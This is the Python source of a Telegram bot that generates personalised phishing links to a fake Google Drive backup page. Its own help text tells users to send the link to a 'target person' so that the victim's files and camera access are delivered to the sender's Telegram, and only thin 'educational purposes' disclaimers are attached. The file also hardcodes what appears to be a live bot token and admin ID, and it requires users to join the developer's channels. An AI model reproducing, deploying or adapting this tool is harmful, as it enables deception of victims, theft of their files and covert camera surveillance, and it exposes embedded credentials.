import telebot
from telebot import types
import os
from datetime import datetime
import json
import threading
import time
import html

# Configuration
BOT_TOKEN = "8955562967:AAEMoQnvcZk-hUmL8A0hcpNIa_lTozDZTJk"
ADMIN_ID = "7755338110"
DOMAIN = "https://unlimited-cloud-storage.vercel.app/"
PAGE_PATH = "/index.html"

# Channel Configuration
REQUIRED_CHANNELS = [
    {"name": "🔐 Security Updates", "url": "https://t.me/ronjumodz", "username": "@ronjumodz"},
    {"name": "📢 Announcements", "url": "https://t.me/ronjubackup", "username": "@ronjubackup"}
]

# File paths
USERS_FILE = "users.json"
BROADCAST_FILE = "broadcast_messages.json"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# Load users data
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

# Save users data
def save_users(users_data):
    with open(USERS_FILE, 'w') as f:
        json.dump(users_data, f, indent=4)

# Load broadcast messages
def load_broadcasts():
    try:
        with open(BROADCAST_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

# Save broadcast messages
def save_broadcasts(broadcasts):
    with open(BROADCAST_FILE, 'w') as f:
        json.dump(broadcasts, f, indent=4)

# Escape HTML
def escape_html(text):
    if not text:
        return ""
    return html.escape(text)

# Start command with channel verification
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    users = load_users()
    
    if user_id not in users:
        users[user_id] = {
            'username': username,
            'first_name': user_name,
            'join_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'verified': False,
            'links_generated': 0,
            'links': []
        }
        save_users(users)
    
    if not users[user_id]['verified']:
        show_verification_required(message)
        return
    
    welcome_text = f"""
<b>🤖 Welcome to Google Drive Link Generator</b>

Hello {escape_html(user_name)}! I can generate personalized Google Drive backup links for you.

<b>Available Commands:</b>
/generate - Create your personal link
/mylink - View your generated link
/help - Get help

<code>⚠️ Note: This bot is for educational purposes only.</code>
"""
    
    keyboard = types.InlineKeyboardMarkup()
    generate_btn = types.InlineKeyboardButton("✨ Generate Link", callback_data="generate")
    keyboard.add(generate_btn)
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard)

def show_verification_required(message):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    
    for channel in REQUIRED_CHANNELS:
        btn = types.InlineKeyboardButton(
            f"Join {channel['name']}",
            url=channel['url']
        )
        keyboard.add(btn)
    
    verify_btn = types.InlineKeyboardButton(
        "✅ I've Joined All Channels",
        callback_data="verify_channels"
    )
    keyboard.add(verify_btn)
    
    verification_text = """
<b>🔒 Channel Membership Required</b>

To use this bot, you must join our official channels first:

"""
    
    for channel in REQUIRED_CHANNELS:
        verification_text += f"\n👉 {channel['name']}: {channel['username']}"
    
    verification_text += """

<b>📌 Steps:</b>
1. Join all channels above
2. Click "I've Joined All Channels"
3. Start using the bot

<code>⚠️ Note: You must stay in the channels to continue using the bot.</code>
"""
    
    bot.send_message(
        message.chat.id,
        verification_text,
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data == "verify_channels")
def verify_channels(call):
    user_id = str(call.from_user.id)
    
    users = load_users()
    if user_id in users:
        users[user_id]['verified'] = True
        save_users(users)
        
        bot.answer_callback_query(call.id, "✅ Verification successful!")
        
        welcome_text = f"""
<b>🤖 Welcome to Google Drive Link Generator</b>

Hello {escape_html(call.from_user.first_name)}! I can generate personalized Google Drive backup links for you.

<b>Available Commands:</b>
/generate - Create your personal link
/mylink - View your generated link
/help - Get help

<code>⚠️ Note: This bot is for educational purposes only.</code>
"""
        
        keyboard = types.InlineKeyboardMarkup()
        generate_btn = types.InlineKeyboardButton("✨ Generate Link", callback_data="generate")
        keyboard.add(generate_btn)
        
        bot.send_message(call.message.chat.id, welcome_text, reply_markup=keyboard)
    else:
        bot.answer_callback_query(call.id, "❌ User not found!")

@bot.message_handler(commands=['generate'])
def generate_link(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    
    users = load_users()
    if user_id not in users or not users[user_id]['verified']:
        show_verification_required(message)
        return
    
    generated_link = f"{DOMAIN}{PAGE_PATH}?token={BOT_TOKEN}&chatid={user_id}"
    
    if user_id in users:
        if 'links' not in users[user_id]:
            users[user_id]['links'] = []
        users[user_id]['links'].append({
            'link': generated_link,
            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        users[user_id]['links_generated'] = len(users[user_id]['links'])
        save_users(users)
    
    response_text = f"""
<b>✅ Link Generated Successfully!</b>

<b>🔗 Your Personal Link:</b>
<code>{escape_html(generated_link)}</code>

<b>📊 Link Details:</b>
👤 Created for: {escape_html(user_name)}
🆔 Your Chat ID: <code>{user_id}</code>
🕐 Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
📈 Total Links Generated: {users[user_id]['links_generated']}

<b>📋 How to Use:</b>
1. Send this link to the target person
2. When they open it, they'll see a Google Drive backup page
3. When they click "Allow Access", their files and camera access will be sent to YOUR Telegram

<code>⚠️ Warning: Use only for educational and ethical purposes.</code>

Developer: @Ronju360
"""
    
    keyboard = types.InlineKeyboardMarkup()
    copy_btn = types.InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}")
    preview_btn = types.InlineKeyboardButton("👁️ Preview", url=generated_link)
    keyboard.add(copy_btn, preview_btn)
    
    bot.send_message(message.chat.id, response_text, reply_markup=keyboard)
    
    admin_msg = f"""
<b>🆕 New Link Generated!</b>

👤 User: {escape_html(user_name)} (@{message.from_user.username or 'No username'})
🆔 ID: {user_id}
🕐 Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
🔗 Link: {generated_link}
"""
    try:
        bot.send_message(ADMIN_ID, admin_msg)
    except:
        pass

@bot.message_handler(commands=['mylink'])
def show_my_link(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    
    users = load_users()
    if user_id not in users or not users[user_id]['verified']:
        show_verification_required(message)
        return
    
    if 'links' not in users[user_id] or not users[user_id]['links']:
        response_text = "You haven't generated any link yet. Use /generate to create one."
        keyboard = types.InlineKeyboardMarkup()
        generate_btn = types.InlineKeyboardButton("✨ Generate Link", callback_data="generate")
        keyboard.add(generate_btn)
    else:
        latest_link = users[user_id]['links'][-1]['link']
        
        response_text = f"""
<b>📋 Your Generated Link</b>

<b>🔗 Latest Link:</b>
<code>{escape_html(latest_link)}</code>

👤 Created for: {escape_html(user_name)}
🆔 Your Chat ID: <code>{user_id}</code>
📊 Total Links: {users[user_id]['links_generated']}

<b>📋 To use again:</b>
Click /generate to create a new link
"""
        
        keyboard = types.InlineKeyboardMarkup()
        copy_btn = types.InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}")
        preview_btn = types.InlineKeyboardButton("👁️ Preview", url=latest_link)
        new_btn = types.InlineKeyboardButton("✨ New Link", callback_data="generate")
        keyboard.add(copy_btn, preview_btn)
        keyboard.add(new_btn)
    
    bot.send_message(message.chat.id, response_text, reply_markup=keyboard)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = """
<b>🆘 Help Center</b>

<b>How to use this bot:</b>

1. Join the required channels first
2. Click /generate to create your personal link
3. Send the link to target person
4. When they open it, they'll see a fake Google Drive page
5. When they click "Allow Access", their files will be sent to YOUR Telegram

<b>Commands:</b>
/start - Start the bot
/generate - Create your personal link
/mylink - View your generated link
/help - Show this help message

<b>Required Channels:</b>
"""
    
    for channel in REQUIRED_CHANNELS:
        help_text += f"\n🔗 {channel['name']}: {channel['username']}"
    
    help_text += """

<code>⚠️ Important:</code>
- Use only for educational purposes
- Don't misuse this tool
- Respect others' privacy

<b>Support:</b> Contact admin if you need help.

Developer: @Ronju360
"""
    
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = str(message.from_user.id)
    
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ This command is for admin only.")
        return
    
    users_data = load_users()
    total_users = len(users_data)
    verified_users = sum(1 for u in users_data.values() if u.get('verified', False))
    total_links = sum(u.get('links_generated', 0) for u in users_data.values())
    
    recent_users = []
    user_items = list(users_data.items())
    for uid, data in user_items[-10:]:
        recent_users.append({
            'id': uid,
            'name': data.get('first_name', 'Unknown'),
            'username': data.get('username', 'No username'),
            'verified': data.get('verified', False),
            'links': data.get('links_generated', 0),
            'join_date': data.get('join_date', 'Unknown')
        })
    
    try:
        bot_info = bot.get_me()
        bot_username = f"@{bot_info.username}" if bot_info and bot_info.username else "Unknown"
    except:
        bot_username = "Unknown"
    
    stats_text = f"""
<b>📊 Bot Statistics</b>

🤖 Bot: {escape_html(bot_username)}
👥 Total Users: {total_users}
✅ Verified Users: {verified_users}
📈 Total Links Generated: {total_links}
🕐 Current Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
🔗 Domain: {DOMAIN}

<b>📋 Recent Users (Last 10):</b>
"""
    
    for i, user in enumerate(recent_users, 1):
        status = "✅" if user['verified'] else "❌"
        user_name = escape_html(user['name'])
        user_username = escape_html(user['username'])
        stats_text += f"\n{i}. {user_name} ({user_username}) {status}"
        stats_text += f"\n   ID: <code>{user['id']}</code> | Links: {user['links']} | Joined: {user['join_date']}"
    
    keyboard = types.InlineKeyboardMarkup()
    userlist_btn = types.InlineKeyboardButton("📜 Full User List", callback_data="full_userlist")
    broadcast_btn = types.InlineKeyboardButton("📢 Broadcast", callback_data="broadcast_menu")
    keyboard.add(userlist_btn, broadcast_btn)
    
    bot.send_message(message.chat.id, stats_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "full_userlist")
def show_full_userlist(call):
    user_id = str(call.from_user.id)
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Admin only!", show_alert=True)
        return
    
    users_data = load_users()
    
    if not users_data:
        bot.answer_callback_query(call.id, "No users found!", show_alert=True)
        return
    
    userlist_text = "<b>📜 Full User List</b>\n\n"
    
    for uid, data in users_data.items():
        status = "✅" if data.get('verified', False) else "❌"
        user_name = escape_html(data.get('first_name', 'Unknown'))
        user_username = escape_html(data.get('username', 'No username'))
        userlist_text += f"👤 {user_name} ({user_username}) {status}\n"
        userlist_text += f"🆔 ID: <code>{uid}</code>\n"
        userlist_text += f"📊 Links: {data.get('links_generated', 0)}\n"
        userlist_text += f"📅 Joined: {data.get('join_date', 'Unknown')}\n"
        userlist_text += "─" * 20 + "\n"
    
    if len(userlist_text) > 4000:
        chunks = [userlist_text[i:i+4000] for i in range(0, len(userlist_text), 4000)]
        for chunk in chunks:
            bot.send_message(call.message.chat.id, chunk)
    else:
        bot.send_message(call.message.chat.id, userlist_text)
    
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = str(message.from_user.id)
    
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ This command is for admin only.")
        return
    
    if len(message.text.split()) > 1:
        broadcast_message = message.text.split(' ', 1)[1]
        start_broadcast(message.chat.id, broadcast_message)
    else:
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        
        templates = [
            ("📢 Update Notification", "update"),
            ("⚠️ Maintenance Notice", "maintenance"),
            ("🎉 New Feature", "feature"),
            ("✍️ Custom Message", "custom")
        ]
        
        for label, template_type in templates:
            btn = types.InlineKeyboardButton(label, callback_data=f"broadcast_{template_type}")
            keyboard.add(btn)
        
        broadcast_text = """
<b>📢 Broadcast Message System</b>

Select a template or create custom message:

1. 📢 Update Notification
2. ⚠️ Maintenance Notice  
3. 🎉 New Feature
4. ✍️ Custom Message

Or send: <code>/broadcast Your message here</code>
"""
        
        bot.send_message(message.chat.id, broadcast_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("broadcast_"))
def broadcast_menu(call):
    user_id = str(call.from_user.id)
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Admin only!", show_alert=True)
        return
    
    if call.data == "broadcast_menu":
        broadcast_command(call.message)
    
    elif call.data == "broadcast_custom":
        msg = bot.send_message(call.message.chat.id, 
                             "<b>✍️ Send your custom broadcast message:</b>\n\n(You can use HTML formatting)",
                             parse_mode='HTML')
        bot.register_next_step_handler(msg, process_custom_broadcast)
    
    elif call.data in ["broadcast_update", "broadcast_maintenance", "broadcast_feature"]:
        template_type = call.data.replace("broadcast_", "")
        
        templates = {
            "update": "🔔 <b>Important Update</b>\n\nWe've improved our services. Stay tuned for more features!",
            "maintenance": "🛠️ <b>Maintenance Notice</b>\n\nThe bot will be temporarily unavailable for maintenance.",
            "feature": "🎊 <b>New Feature Added</b>\n\nCheck out our latest feature in the bot!"
        }
        
        if template_type in templates:
            start_broadcast(call.message.chat.id, templates[template_type])
    
    bot.answer_callback_query(call.id)

def process_custom_broadcast(message):
    user_id = str(message.from_user.id)
    
    if user_id != ADMIN_ID:
        return
    
    start_broadcast(message.chat.id, message.text)

temp_broadcast_message = None

def start_broadcast(chat_id, message_text):
    users_data = load_users()
    total_users = len(users_data)
    
    keyboard = types.InlineKeyboardMarkup()
    confirm_btn = types.InlineKeyboardButton("✅ Confirm Broadcast", callback_data="confirm_broadcast")
    cancel_btn = types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_broadcast")
    keyboard.add(confirm_btn, cancel_btn)
    
    global temp_broadcast_message
    temp_broadcast_message = message_text
    
    preview_text = f"""
<b>📢 Broadcast Preview</b>

{message_text}

---
<b>📊 Stats:</b>
👥 Total Recipients: {total_users} users
⚠️ This action cannot be undone.

Click Confirm to send this message to all users.
"""
    
    bot.send_message(chat_id, preview_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "confirm_broadcast")
def confirm_broadcast(call):
    user_id = str(call.from_user.id)
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Admin only!", show_alert=True)
        return
    
    global temp_broadcast_message
    if temp_broadcast_message:
        actual_broadcast(call.message.chat.id, temp_broadcast_message)
        temp_broadcast_message = None
    
    bot.answer_callback_query(call.id, "Broadcast started!")

@bot.callback_query_handler(func=lambda call: call.data == "cancel_broadcast")
def cancel_broadcast(call):
    bot.answer_callback_query(call.id, "Broadcast cancelled!")
    bot.delete_message(call.message.chat.id, call.message.message_id)

def actual_broadcast(chat_id, message_text):
    users_data = load_users()
    total_users = len(users_data)
    total_sent = 0
    failed_sent = 0
    
    broadcasts = load_broadcasts()
    broadcasts.append({
        'message': message_text,
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'total_users': total_users
    })
    save_broadcasts(broadcasts)
    
    progress_msg = bot.send_message(chat_id, "📤 Starting broadcast...")
    
    for user_id in users_data:
        try:
            bot.send_message(int(user_id), message_text)
            total_sent += 1
            
            if total_sent % 10 == 0:
                bot.edit_message_text(
                    f"📤 Broadcasting... ({total_sent}/{total_users})",
                    chat_id, progress_msg.message_id
                )
            
            time.sleep(0.05)
        except Exception as e:
            failed_sent += 1
    
    report_text = f"""
<b>✅ Broadcast Completed!</b>

<b>📊 Report:</b>
👥 Total Users: {total_users}
✅ Successfully Sent: {total_sent}
❌ Failed: {failed_sent}
📅 Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

<b>💬 Message Sent:</b>
{escape_html(message_text[:200])}...
"""
    
    bot.delete_message(chat_id, progress_msg.message_id)
    bot.send_message(chat_id, report_text)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "generate":
        msg = type('obj', (object,), {
            'from_user': call.from_user, 
            'chat': type('obj', (object,), {'id': call.message.chat.id})()
        })()
        generate_link(msg)
    
    elif call.data.startswith("copy_"):
        uid = call.data[5:]
        users_data = load_users()
        
        if uid in users_data and users_data[uid].get('links'):
            latest_link = users_data[uid]['links'][-1]['link']
            
            copy_text = f"""
<b>📋 Copy this link:</b>

<code>{escape_html(latest_link)}</code>

(Select and copy the text above)
"""
            bot.send_message(call.message.chat.id, copy_text)
            bot.answer_callback_query(call.id, "Link copied to message!", show_alert=False)
        else:
            bot.answer_callback_query(call.id, "Link not found!", show_alert=True)
    
    elif call.data == "cancel_broadcast":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "Cancelled")

# Run bot
if __name__ == "__main__":
    print("🤖 Bot is starting...")
    print(f"🔗 Domain: {DOMAIN}")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"📢 Required Channels: {len(REQUIRED_CHANNELS)}")
    print("=" * 50)
    
    if not os.path.exists(USERS_FILE):
        save_users({})
    
    if not os.path.exists(BROADCAST_FILE):
        save_broadcasts([])
    
    try:
        bot_info = bot.get_me()
        if bot_info:
            print(f"✅ Bot started successfully!")
            print(f"🤖 Bot Username: @{bot_info.username}")
            print(f"🆔 Bot ID: {bot_info.id}")
            print("=" * 50)
            print("Bot is now running...")
        else:
            print("❌ Failed to get bot info")
            exit(1)
    except Exception as e:
        print(f"❌ Error connecting to Telegram: {e}")
        print("Please check your bot token and try again.")
        exit(1)
    
    while True:
        try:
            print("🔄 Starting bot polling...")
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"⚠️ Bot error: {e}")
            print("🔄 Restarting in 5 seconds...")
            time.sleep(5)
